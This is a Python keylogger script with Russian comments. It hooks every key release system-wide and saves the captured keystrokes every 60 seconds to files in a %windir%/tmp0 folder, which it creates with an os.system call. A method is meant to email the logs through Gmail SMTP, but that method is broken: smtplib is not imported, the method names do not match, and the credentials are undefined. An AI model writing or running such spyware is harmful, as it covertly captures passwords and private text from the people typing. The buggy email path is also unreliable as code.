import logging
import os
import keyboard
from threading import Timer
from datetime import datetime

OSMKDIR = "mkdir %windir%/tmp0"
DIR_PATH = "%windir%/tmp0"
SEND_REPORT_EVERY = 60
class Keylogger:
    def __init__(self, interval, report_method="file"):
        # передаем SEND_REPORT_EVERY в интервал
        self.interval = interval
        self.report_method = report_method
        # это строковая переменная, которая содержит лог
        self.log = ""
        #запись начала и окончания даты и времени
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # не символ, специальная клавиша (например, ctrl, alt и т. д.)
            # верхний регистр
            if name == "space":
                # " " вместо пробелов
                name = " "
            elif name == "enter":
                # добавлять новую строку всякий раз, когда нажимается ENTER
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # замените пробелы символами подчеркивания
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # добавить имя ключа в глобальную переменную
        self.log += name

    def update_filename(self):
        # создать имя файла, которое будет идентифицировано по дате начала и окончания записи
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # создать файл
        with open(f"{DIR_PATH}/{self.filename}.txt", "w") as f:
            # записать лог
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendtg(self, email, password, message):
        # управляет подключением к SMTP-серверу
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # подключиться к SMTP-серверу в режиме TLS
        server.starttls()
        # логин
        server.login(email, password)
        # отправить сообщение
        server.sendmail(email, email, message)
        # завершает сеанс
        server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            # обновить `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        # старт
        timer.start()

    def start(self):
        # записать дату и время начала
        self.start_dt = datetime.now()
        # запустить кейлогер
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()




if __name__ == "__main__":
    os.system(OSMKDIR)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()


